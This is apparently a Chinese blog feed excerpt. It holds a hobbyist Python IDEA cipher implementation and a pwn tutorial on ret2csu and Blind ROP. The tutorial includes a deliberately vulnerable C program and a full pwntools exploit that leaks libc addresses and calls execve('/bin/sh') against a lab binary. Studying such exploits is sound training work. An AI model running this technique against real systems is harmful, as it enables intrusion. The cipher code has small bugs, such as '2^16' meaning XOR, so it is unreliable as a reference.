    
    <summary type="html">
    
      
      
        
        
          
        
      
    
    </summary>
    
    
      <category term="Crypto" scheme="http://xibai.xyz/categories/Crypto/"/>
    
    
      <category term="Crypto" scheme="http://xibai.xyz/tags/Crypto/"/>
    
      <category term="python" scheme="http://xibai.xyz/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>(密码学)(crypto)IDEA_Crypto(ECB模式)——python实现</title>
    <link href="http://xibai.xyz/2020/04/30/(crypto)IDEA_Crypto(ECB)/"/>
    <id>http://xibai.xyz/2020/04/30/(crypto)IDEA_Crypto(ECB)/</id>
    <published>2020-04-29T17:10:44.768Z</published>
    <updated>2020-05-13T07:34:58.678Z</updated>
    
    <content type="html"><![CDATA[<pre><code class="python"><span class="comment"># -*- coding:utf-8 -*-</span><span class="function"><span class="keyword">def</span> <span class="title">FindMODreverse</span><span class="params">(a,m)</span>:</span>                        <span class="comment"># 欧几里得除法求模逆元</span>    m_tmp = m    x_1,x_2 = <span class="number">1</span>,<span class="number">0</span>    y_1,y_2 = <span class="number">0</span>,<span class="number">1</span>    <span class="keyword">while</span> m != <span class="number">0</span>:        q = a//m        x_2,y_2,m,x_1,y_1,a = (x_1 - q * x_2),(y_1 - q * y_2),a % m,x_2,y_2,m    <span class="keyword">while</span> x_1 &lt; <span class="number">0</span>:        x_1 += m_tmp    <span class="keyword">while</span> x_1 &gt;= m_tmp:        x_1 -= m_tmp    <span class="keyword">return</span> x_1<span class="function"><span class="keyword">def</span> <span class="title">ROL</span><span class="params">(lit,num)</span>:</span>                               <span class="comment"># 循环左移 num 位</span>    <span class="keyword">return</span> lit[num:] + lit[:num]<span class="function"><span class="keyword">def</span> <span class="title">idea_xor</span><span class="params">(x,y)</span>:</span>                              <span class="comment"># 逐位异或</span>    tmp = <span class="string">''</span> ; i = <span class="number">0</span>    <span class="keyword">while</span> <span class="literal">True</span>:        <span class="keyword">try</span>:            tmp += str(int(x[i],<span class="number">2</span>)^int(y[i],<span class="number">2</span>))            i += <span class="number">1</span>        <span class="keyword">except</span>:            <span class="keyword">return</span> tmp<span class="function"><span class="keyword">def</span> <span class="title">idea_add</span><span class="params">(x,y)</span>:</span>                              <span class="comment"># 模65536相加</span>    x = int(x,<span class="number">2</span>) ; y = int(y,<span class="number">2</span>)    z = ( x + y ) % <span class="number">65536</span>    z = bin(z)[<span class="number">2</span>:]    tmp = <span class="string">'0'</span>*(<span class="number">16</span> - len(z)) + z    <span class="keyword">return</span> tmp<span class="function"><span class="keyword">def</span> <span class="title">idea_mul</span><span class="params">(x,y)</span>:</span>                              <span class="comment"># 模65537相乘</span>    x = int(x,<span class="number">2</span>) ; y = int(y,<span class="number">2</span>)    <span class="keyword">if</span> x == <span class="number">0</span>:        x = <span class="number">2</span>^<span class="number">16</span>    <span class="keyword">if</span> y == <span class="number">0</span>:        y = <span class="number">2</span>^<span class="number">16</span>    z = ( ( x * y ) % <span class="number">65537</span> ) % <span class="number">65536</span>    z = bin(z)[<span class="number">2</span>:]    tmp = <span class="string">'0'</span>*(<span class="number">16</span> - len(z)) + z    <span class="keyword">return</span> tmp<span class="function"><span class="keyword">def</span> <span class="title">idea_encode</span><span class="params">(m,num,key)</span>:</span>                     <span class="comment"># 加密过程</span>    x_array = [m[i*<span class="number">16</span>:i*<span class="number">16</span>+<span class="number">16</span>] <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>)]    z_array = key[num*<span class="number">6</span>:num*<span class="number">6</span>+<span class="number">6</span>]    <span class="keyword">if</span> num &lt; <span class="number">8</span>:        out_1 = idea_mul(x_array[<span class="number">0</span>],z_array[<span class="number">0</span>])        out_2 = idea_add(x_array[<span class="number">1</span>],z_array[<span class="number">1</span>])        out_3 = idea_add(x_array[<span class="number">2</span>],z_array[<span class="number">2</span>])        out_4 = idea_mul(x_array[<span class="number">3</span>],z_array[<span class="number">3</span>])        out_5 = idea_mul(z_array[<span class="number">4</span>],idea_xor(out_1,out_3))        out_6 = idea_mul(z_array[<span class="number">5</span>],idea_add(idea_xor(out_2,out_4),out_5))        out_7 = idea_add(out_5,out_6)        w_1 = idea_xor(out_1,out_6)        w_2 = idea_xor(out_3,out_6)        w_3 = idea_xor(out_2,out_7)        w_4 = idea_xor(out_4,out_7)        c = w_1 + w_2 + w_3 + w_4        num += <span class="number">1</span>        c = idea_encode(c,num,key)    <span class="keyword">else</span>:        y_1 = idea_mul(x_array[<span class="number">0</span>],z_array[<span class="number">0</span>])        y_2 = idea_add(x_array[<span class="number">2</span>],z_array[<span class="number">1</span>])        y_3 = idea_add(x_array[<span class="number">1</span>],z_array[<span class="number">2</span>])        y_4 = idea_mul(x_array[<span class="number">3</span>],z_array[<span class="number">3</span>])        c = y_1 + y_2 + y_3 + y_4    <span class="keyword">return</span> c<span class="function"><span class="keyword">def</span> <span class="title">IDEA_Crypto</span><span class="params">(cm_str,key,mode)</span>:</span>    <span class="keyword">if</span> mode == <span class="number">0</span>:        <span class="keyword">if</span> len(cm_str) % <span class="number">8</span> != <span class="number">0</span>:                         <span class="comment"># 对明文进行填充</span>            cm_str += <span class="string">'\x00'</span> * ( <span class="number">8</span> - len(cm_str) % <span class="number">8</span> )        m_bin = <span class="string">''</span>                                       <span class="comment"># 将明文转化为二元序列</span>        <span class="keyword">for</span> i <span class="keyword">in</span> cm_str.encode(<span class="string">'utf-8'</span>):            i = bin(i)[<span class="number">2</span>:]            m_bin += <span class="string">'0'</span>*(<span class="number">8</span> - len(i)) + i    <span class="keyword">else</span>:                                                <span class="comment"># 将密文转化为二元序列</span>        c_bin = bin(int(cm_str,<span class="number">16</span>))[<span class="number">2</span>:]        <span class="keyword">if</span> len(c_bin) % <span class="number">8</span> != <span class="number">0</span>:            c_bin = <span class="string">'0'</span>*(<span class="number">8</span> - (len(c_bin) % <span class="number">8</span>)) + c_bin    key_bin = <span class="string">''</span>                                         <span class="comment"># 将密钥转化为二元序列</span>    <span class="keyword">for</span> i <span class="keyword">in</span> key.encode(<span class="string">'utf-8'</span>):        i = bin(i)[<span class="number">2</span>:]        key_bin += <span class="string">'0'</span>*(<span class="number">8</span> - len(i)) + i    key_encrypt_array = []                                       <span class="comment"># 生成加密子密钥</span>    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">6</span>):        <span class="keyword">for</span> j <span class="keyword">in</span> [key_bin[k*<span class="number">16</span>:k*<span class="number">16</span>+<span class="number">16</span>] <span class="keyword">for</span> k <span class="keyword">in</span> range(<span class="number">8</span>)]:            key_encrypt_array.append(j)        key_bin = ROL(key_bin,<span class="number">25</span>)    <span class="keyword">else</span>:        key_encrypt_array.extend([key_bin[k*<span class="number">16</span>:k*<span class="number">16</span>+<span class="number">16</span>] <span class="keyword">for</span> k <span class="keyword">in</span> range(<span class="number">8</span>)][:<span class="number">4</span>])    key_decrypt_array = [] ; flag = <span class="number">0</span>                            <span class="comment"># 生成解密子密钥</span>    key_tmp_array = key_encrypt_array[::<span class="number">-1</span>]    <span class="keyword">for</span> i <span class="keyword">in</span> [key_tmp_array[i*<span class="number">6</span>:i*<span class="number">6</span>+<span class="number">6</span>] <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">8</span>)]:        i[:<span class="number">4</span>] = i[<span class="number">3</span>::<span class="number">-1</span>] ; i[<span class="number">-2</span>:] = i[:<span class="number">-3</span>:<span class="number">-1</span>]        <span class="keyword">if</span> flag == <span class="number">0</span>:                                            <span class="comment"># 第一轮和最后一轮的第二三子密钥特殊取值</span>            Addrev = bin((<span class="number">65536</span> - int(i[<span class="number">1</span>],<span class="number">2</span>)) % <span class="number">65536</span>)[<span class="number">2</span>:]            i[<span class="number">1</span>] = <span class="string">'0'</span>*(<span class="number">16</span>-len(Addrev)) + Addrev            Addrev = bin((<span class="number">65536</span> - int(i[<span class="number">2</span>],<span class="number">2</span>)) % <span class="number">65536</span>)[<span class="number">2</span>:]            i[<span class="number">2</span>] = <span class="string">'0'</span>*(<span class="number">16</span>-len(Addrev)) + Addrev            flag += <span class="number">1</span>        <span class="keyword">else</span>:            Addrev = bin((<span class="number">65536</span> - int(i[<span class="number">1</span>],<span class="number">2</span>)) % <span class="number">65536</span>)[<span class="number">2</span>:]            tmp_1 = <span class="string">'0'</span>*(<span class="number">16</span>-len(Addrev)) + Addrev            Addrev = bin((<span class="number">65536</span> - int(i[<span class="number">2</span>],<span class="number">2</span>)) % <span class="number">65536</span>)[<span class="number">2</span>:]            tmp_2 = <span class="string">'0'</span>*(<span class="number">16</span>-len(Addrev)) + Addrev            i[<span class="number">1</span>] = tmp_2            i[<span class="number">2</span>] = tmp_1        Modrev = bin(FindMODreverse(int(i[<span class="number">0</span>],<span class="number">2</span>),<span class="number">65537</span>))[<span class="number">2</span>:]        i[<span class="number">0</span>] = <span class="string">'0'</span>*(<span class="number">16</span>-len(Modrev)) + Modrev        Modrev = bin(FindMODreverse(int(i[<span class="number">3</span>],<span class="number">2</span>),<span class="number">65537</span>))[<span class="number">2</span>:]        i[<span class="number">3</span>] = <span class="string">'0'</span>*(<span class="number">16</span>-len(Modrev)) + Modrev        key_decrypt_array.extend(i)    <span class="keyword">else</span>:                                                       <span class="comment"># 最后一轮第九轮的解密密钥</span>        i = key_tmp_array[<span class="number">-4</span>:][::<span class="number">-1</span>]        Addrev = bin((<span class="number">65536</span> - int(i[<span class="number">1</span>],<span class="number">2</span>)) % <span class="number">65536</span>)[<span class="number">2</span>:]        i[<span class="number">1</span>] = <span class="string">'0'</span>*(<span class="number">16</span>-len(Addrev)) + Addrev        Addrev = bin((<span class="number">65536</span> - int(i[<span class="number">2</span>],<span class="number">2</span>)) % <span class="number">65536</span>)[<span class="number">2</span>:]        i[<span class="number">2</span>] = <span class="string">'0'</span>*(<span class="number">16</span>-len(Addrev)) + Addrev        Modrev = bin(FindMODreverse(int(i[<span class="number">0</span>],<span class="number">2</span>),<span class="number">65537</span>))[<span class="number">2</span>:]        i[<span class="number">0</span>] = <span class="string">'0'</span>*(<span class="number">16</span>-len(Modrev)) + Modrev        Modrev = bin(FindMODreverse(int(i[<span class="number">3</span>],<span class="number">2</span>),<span class="number">65537</span>))[<span class="number">2</span>:]        i[<span class="number">3</span>] = <span class="string">'0'</span>*(<span class="number">16</span>-len(Modrev)) + Modrev        key_decrypt_array.extend(i)    <span class="keyword">if</span> mode == <span class="number">0</span>:                                   <span class="comment"># 文本二元序列的分组</span>        mc_array = [ m_bin[i*<span class="number">64</span>:i*<span class="number">64</span>+<span class="number">64</span>] \            <span class="keyword">for</span> i <span class="keyword">in</span> range(int(len(m_bin) / <span class="number">64</span>)) ]      <span class="keyword">else</span>:        mc_array = [ c_bin[i*<span class="number">64</span>:i*<span class="number">64</span>+<span class="number">64</span>] \            <span class="keyword">for</span> i <span class="keyword">in</span> range(int(len(c_bin) / <span class="number">64</span>)) ]    cm_array = []                                   <span class="comment"># 求结果分组</span>    <span class="keyword">if</span> mode == <span class="number">0</span>:        <span class="keyword">for</span> i <span class="keyword">in</span> mc_array:            cm_array.append(idea_encode(i,<span class="number">0</span>,key_encrypt_array))    <span class="keyword">else</span>:        <span class="keyword">for</span> i <span class="keyword">in</span> mc_array:            cm_array.append(idea_encode(i,<span class="number">0</span>,key_decrypt_array))    cm = <span class="string">''</span>                                      <span class="comment"># 将结果分组转换为对应的十六进制内容</span>    <span class="keyword">for</span> i <span class="keyword">in</span> cm_array:        tmp = hex(int(i,<span class="number">2</span>))[<span class="number">2</span>:]        <span class="keyword">if</span> len(tmp) * <span class="number">4</span> != len(i):            tmp = <span class="string">'0'</span>*int(len(i) / <span class="number">4</span> - len(tmp)) + tmp        cm += tmp    <span class="keyword">if</span> mode == <span class="number">0</span>:        print(<span class="string">'密文：'</span> + cm)    <span class="keyword">else</span>:        print(<span class="string">'明文(hex):'</span> + cm)    <span class="keyword">return</span> cm<span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:    m = <span class="string">'1234567812345678'</span>    key = <span class="string">'1234567812345678'</span>    c = IDEA_Crypto(m,key,<span class="number">0</span>)    m_tmp = IDEA_Crypto(c,key,<span class="number">1</span>)<span class="string">'''</span></code></pre>]]></content>
    
    <summary type="html">
    
      
      
        
        
          
        
      
    
    </summary>
    
    
      <category term="Crypto" scheme="http://xibai.xyz/categories/Crypto/"/>
    
    
      <category term="Crypto" scheme="http://xibai.xyz/tags/Crypto/"/>
    
      <category term="python" scheme="http://xibai.xyz/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>汐白学Pwn-3.2(ROP-Intermediate)</title>
    <link href="http://xibai.xyz/2020/04/24/%E6%B1%90%E7%99%BD%E5%AD%A6PWN-3.2(ROP)/"/>
    <id>http://xibai.xyz/2020/04/24/%E6%B1%90%E7%99%BD%E5%AD%A6PWN-3.2(ROP)/</id>
    <published>2020-04-24T07:52:13.108Z</published>
    <updated>2020-05-13T07:34:59.278Z</updated>
    
    <content type="html"><![CDATA[<p>前面介绍了栈溢出的基础操作，现在开始应该才算是入门操作了</p><h2 id="ret2csu"><a href="#ret2csu" class="headerlink" title="ret2csu"></a>ret2csu</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>我们知道64位的程序，其函数传参时六个参数以内是通过<code>rdi</code>、<code>rsi</code>、<code>rdx</code>、<code>rcx</code>、<code>r8</code>、<code>r9</code>。也就是如果对64位程序进行栈溢出攻击时，我们不是仅仅在栈上布置输入的数据，我们还要找到可以控制以上六个寄存器的<code>gadgets</code>，而正常情况下我们是很难找到六个寄存器各自对应的<code>gadgets</code>。这个时候，就需要用到<code>__libc_csu_init</code>这个函数了。一般情况下的程序在编译时，编译器会自动调用该函数来完成对<code>libc</code>的初始化操作。也就是大多数程序虽然在编写的时候没有用到该函数，但是编译器会自动为其添加该函数，这些程序也因此都会有这个函数。</p><p>下面是我编译的程序反汇编后看到的这个函数的内容：(听说这玩意有很多不同版本，会有一些细节上的不一样，不过大同小异)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">0000000000401190 &lt;__libc_csu_init&gt;:</span><br><span class="line">  401190: 41 57                 push   r15</span><br><span class="line">  401192: 4c 8d 3d df 1f 00 00  lea    r15,[rip+0x1fdf]        # 403178 &lt;__frame_dummy_init_array_entry&gt;</span><br><span class="line">  401199: 41 56                 push   r14</span><br><span class="line">  40119b: 49 89 d6              mov    r14,rdx</span><br><span class="line">  40119e: 41 55                 push   r13</span><br><span class="line">  4011a0: 49 89 f5              mov    r13,rsi</span><br><span class="line">  4011a3: 41 54                 push   r12</span><br><span class="line">  4011a5: 41 89 fc              mov    r12d,edi</span><br><span class="line">  4011a8: 55                    push   rbp</span><br><span class="line">  4011a9: 48 8d 2d d0 1f 00 00  lea    rbp,[rip+0x1fd0]        # 403180 &lt;__do_global_dtors_aux_fini_array_entry&gt;</span><br><span class="line">  4011b0: 53                    push   rbx</span><br><span class="line">  4011b1: 4c 29 fd              sub    rbp,r15</span><br><span class="line">  4011b4: 48 83 ec 08           sub    rsp,0x8</span><br><span class="line">  4011b8: e8 43 fe ff ff        call   401000 &lt;_init&gt;</span><br><span class="line">  4011bd: 48 c1 fd 03           sar    rbp,0x3</span><br><span class="line">  4011c1: 74 1b                 je     4011de &lt;__libc_csu_init+0x4e&gt;</span><br><span class="line">  4011c3: 31 db                 xor    ebx,ebx</span><br><span class="line">  4011c5: 0f 1f 00              nop    DWORD PTR [rax]</span><br><span class="line">  4011c8: 4c 89 f2              mov    rdx,r14</span><br><span class="line">  4011cb: 4c 89 ee              mov    rsi,r13</span><br><span class="line">  4011ce: 44 89 e7              mov    edi,r12d</span><br><span class="line">  4011d1: 41 ff 14 df           call   QWORD PTR [r15+rbx*8]</span><br><span class="line">  4011d5: 48 83 c3 01           add    rbx,0x1</span><br><span class="line">  4011d9: 48 39 dd              cmp    rbp,rbx</span><br><span class="line">  4011dc: 75 ea                 jne    4011c8 &lt;__libc_csu_init+0x38&gt;</span><br><span class="line">  4011de: 48 83 c4 08           add    rsp,0x8</span><br><span class="line">  4011e2: 5b                    pop    rbx</span><br><span class="line">  4011e3: 5d                    pop    rbp</span><br><span class="line">  4011e4: 41 5c                 pop    r12</span><br><span class="line">  4011e6: 41 5d                 pop    r13</span><br><span class="line">  4011e8: 41 5e                 pop    r14</span><br><span class="line">  4011ea: 41 5f                 pop    r15</span><br><span class="line">  4011ec: c3                    ret</span><br></pre></td></tr></table></figure><p>仔细观察一下就可以发现，我们可以通过<code>0x4011e2</code>处的 <strong>pop链</strong> 和 <code>0x4011c8</code>处的 <strong>mov链</strong> 控制程序执行一个已知地址的函数内容。<br>（ps：之所以控制的是<code>edi</code>而不是<code>rdi</code>寄存器却还能用来给函数传参是因为这里<code>rdi</code>寄存器的高三十二位值为0，可以自己编译一个小程序调试查看）<br>并且因为<strong>程序在执行时其实是cpu在执行程序中对应的机器码，所以最后的pop链其实可以通过控制地址偏移来实现不一样的pop链</strong>。<br>比如说，我们劫持<code>rip</code>后，控制地址为<code>0x4011e5</code>，此时将要执行的内容为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">4011e5: 5c                   pop    rsp</span><br><span class="line">4011e6: 41 5d                pop    r13</span><br><span class="line">4011e8: 41 5e                pop    r14</span><br><span class="line">4011ea: 41 5f                pop    r15</span><br><span class="line">4011ec: c3                   ret</span><br></pre></td></tr></table></figure><h3 id="example"><a href="#example" class="headerlink" title="example"></a>example</h3><p>下面用实例演示对<code>__libc_csu_init</code>中的<code>gadgets</code>的利用:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">vulnerable_function</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">128</span>];</span><br><span class="line">    <span class="built_in">read</span>(STDIN_FILENO, buf, <span class="number">512</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>** argv)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">write</span>(STDOUT_FILENO, <span class="string">"Hello, World\n"</span>, <span class="number">13</span>);</span><br><span class="line">    vulnerable_function();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>程序下载：<a href="http://xibai.xyz/downloads/ctf-wiki/Linux%20Pwn/Stack%20Overflow/Intermediate%20ROP/ret2csu/level5">level5</a></p><p><strong>将其作为64位程序进行编译，并且开启堆栈不可执行（NX）保护</strong>。<br>（注：另外注意，获取shell用的shellcode一般是调用execve(‘/bin/sh’,0,0)函数，因为system函数会受本地环境变量影响导致不可用。）</p><p>该程序在<code>read()</code>时明显存在溢出，但是因为程序非常简单，所以无法找到其他直接控制传参寄存器的<code>gadgets</code>。所以我们覆盖返回地址为<code>__libc_csu_init</code>中的<code>gadgets</code>，然后布置相关参数。<br>这里的攻击思路是，先调用<code>write()</code>泄露<code>got</code>表中已经绑定的函数地址，然后查找到对应libc的版本计算出<code>execve()</code>的地址，然后通过<code>read()</code>将<code>/bin/sh</code>和<code>execve()的地址</code>写到<code>bss</code>段，最后再调用<code>execve()</code>获取shell。</p><p>利用脚本如下：</p><blockquote><p>ps：因为我的本地libc库版本不在LibcSearcher使用的数据库中，<br>所以这里我是先泄露出需要的地址，然后手动查询libc库，从中获<br>取相关数据，所以脚本中会出现计算偏移的步骤中直接用的已知值<br>计算，这些已知值是查询到相关的libc库中对应的基址后写入的）</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">'./level5'</span>)</span><br><span class="line">elf = ELF(<span class="string">'./level5'</span>)</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">'linux'</span>,arch=<span class="string">'amd64'</span>,log_level=<span class="string">'debug'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 写入需要用到的地址</span></span><br><span class="line">write_got = elf.got[<span class="string">'write'</span>]</span><br><span class="line">main = elf.symbols[<span class="string">'main'</span>]</span><br><span class="line">read_got = elf.got[<span class="string">'read'</span>]</span><br><span class="line">libc_start_main_got = elf.got[<span class="string">'__libc_start_main'</span>]</span><br><span class="line">bss_addr = elf.bss()</span><br><span class="line">pop_ret = <span class="number">0x4011e2</span></span><br><span class="line">mov_call = <span class="number">0x4011c8</span></span><br><span class="line">execve_offset = <span class="number">0xcb140</span></span><br><span class="line"></span><br><span class="line">print(p.recv())</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将 csu 中的 gadgets的利用payload 写成函数方便每次使用</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">csu</span><span class="params">(a1,a2,a3,symbol_call)</span>:</span></span><br><span class="line"> payload = <span class="string">'a'</span>*<span class="number">0x88</span></span><br><span class="line"> payload += p64(pop_ret)</span><br><span class="line"> payload += p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(a1) + p64(a2) + p64(a3) + p64(symbol_call)</span><br><span class="line"> payload += p64(mov_call)</span><br><span class="line"> payload += <span class="string">'a'</span>*<span class="number">56</span></span><br><span class="line"> payload += p64(main)</span><br><span class="line"> p.sendline(payload)</span><br><span class="line"></span><br><span class="line">print(<span class="string">"泄露 write 地址"</span>)</span><br><span class="line">csu(<span class="number">1</span>,write_got,<span class="number">8</span>,write_got)</span><br><span class="line">write_addr = u64(p.recv()[:<span class="number">8</span>])</span><br><span class="line">print(hex(write_addr))</span><br><span class="line"></span><br><span class="line">print(<span class="string">"泄露 read 地址"</span>)</span><br><span class="line">csu(<span class="number">1</span>,read_got,<span class="number">8</span>,write_got)</span><br><span class="line">tmp = p.recv()</span><br><span class="line">print(tmp.encode(<span class="string">'hex'</span>))</span><br><span class="line"></span><br><span class="line">print(<span class="string">"泄露 libc_start_main 地址"</span>)</span><br><span class="line">csu(<span class="number">1</span>,libc_start_main_got,<span class="number">8</span>,write_got)</span><br><span class="line">libc_addr = u64(p.recv()[:<span class="number">8</span>])</span><br><span class="line">print(hex(libc_addr))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 计算libc偏移量</span></span><br><span class="line">libcbase = libc_addr - <span class="number">0x026d20</span></span><br><span class="line">system_addr = <span class="number">0x048870</span> + libcbase</span><br><span class="line">bin_sh = <span class="number">0x1881ac</span> + libcbase</span><br><span class="line">execve_addr = execve_offset + libcbase</span><br><span class="line"></span><br><span class="line">csu(<span class="number">0</span>,bss_addr,<span class="number">16</span>,read_got)</span><br><span class="line">p.send( <span class="string">'/bin/sh\x00'</span> + p64(execve_addr))</span><br><span class="line"></span><br><span class="line">csu(bss_addr,<span class="number">0</span>,<span class="number">0</span>,bss_addr+<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="Blind-ROP-盲打pwn"><a href="#Blind-ROP-盲打pwn" class="headerlink" title="Blind ROP(盲打pwn)"></a>Blind ROP(盲打pwn)</h2><p>去实战刷题发现，这东西姿势太多，真的顶不住啊，还是先把例题手撸一遍叭emmm</p><blockquote><p>u1s1，我为啥会觉得后面的高级ROP里面的<code>SROP</code>挺简单的放在这里这个位置其实就挺好，这玩意和接下来的<code>dl_runtime_resolve</code>一起放高级pwn，单纯的pwn小白个人感觉，如果有大佬在小白blog里无聊翻到这里请一笑略过</p></blockquote><p>这里就不像<code>ctf-wiki</code>那样讲的写的那么细了，就用小白入门的方式做个记录。</p><h3 id="Blind-Pwn-原理"><a href="#Blind-Pwn-原理" class="headerlink" title="Blind Pwn 原理"></a>Blind Pwn 原理</h3><h4 id="核心思想"><a href="#核心思想" class="headerlink" title="核心思想"></a>核心思想</h4><p>一个字————猜！！！。什么花里胡哨的paper，其实中心思想就是 <strong>盲猜</strong> 23333.<br><del>鄙人汐小鹰赌你的程序有！漏！洞！</del></p><p>当然，不能瞎吉儿猜，要有理有据的猜才行，毕竟有漏洞无伤大雅，谁写的程序还能没点毛病，关键是这个洞要能被攻击者测试出来，并且利用它实现特殊目的，它才能算是个有用的洞对不对。</p><h4 id="必要条件"><a href="#必要条件" class="headerlink" title="必要条件"></a>必要条件</h4><ul><li>源程序必须存在栈溢出漏洞，以便于攻击者可以控制程序流程。</li><li>服务器端的进程在崩溃之后会重新启动，并且重新启动的进程的地址与先前的地址一样（这也就是说即使程序有 ASLR 保护，但是其只是在程序最初启动的时候有效果）。目前 nginx, MySQL, Apache, OpenSSH 等服务器应用都是符合这种特性的。</li></ul><h4 id="攻击过程"><a href="#攻击过程" class="headerlink" title="攻击过程"></a>攻击过程</h4><ul><li>测试栈溢出长度，以及是否存在格式化字符串漏洞</li><li>枚举一个可用的返回地址，该地址可用的判断条件是只要程序运行到这个地址，一定会出现什么特征，并能让攻击者知晓</li><li>枚举一个<code>gadget</code>，一般是<code>libc_csu_init</code>的结尾那个<code>gadget</code></li><li></li></ul><h2 id="上篇-汐白学Pwn-3-1-ROP-Basic"><a href="#上篇-汐白学Pwn-3-1-ROP-Basic" class="headerlink" title="上篇-汐白学Pwn-3.1(ROP-Basic)"></a><a href="http://xibai.xyz/2020/04/07/%E6%B1%90%E7%99%BD%E5%AD%A6PWN-3.1(ROP)/">上篇-汐白学Pwn-3.1(ROP-Basic)</a></h2><h2 id="下篇-未完待续"><a href="#下篇-未完待续" class="headerlink" title="下篇-未完待续"></a>下篇-未完待续</h2>]]></content>
    
    <summary type="html">
    
      
      
        
        
          
        
      
    
    </summary>
    
    
      <category term="Pwn" scheme="http://xibai.xyz/categories/Pwn/"/>
    
    
      <category term="Pwn" scheme="http://xibai.xyz/tags/Pwn/"/>
    
  </entry>
  
  <entry>
    <title>汐白学Pwn-3.1(ROP-Basic)</title>
    <link href="http://xibai.xyz/2020/04/07/%E6%B1%90%E7%99%BD%E5%AD%A6PWN-3.1(ROP)/"/>
    <id>http://xibai.xyz/2020/04/07/%E6%B1%90%E7%99%BD%E5%AD%A6PWN-3.1(ROP)/</id>
    <published>2020-04-07T13:30:21.609Z</published>
    <updated>2020-05-13T07:34:59.277Z</updated>
    
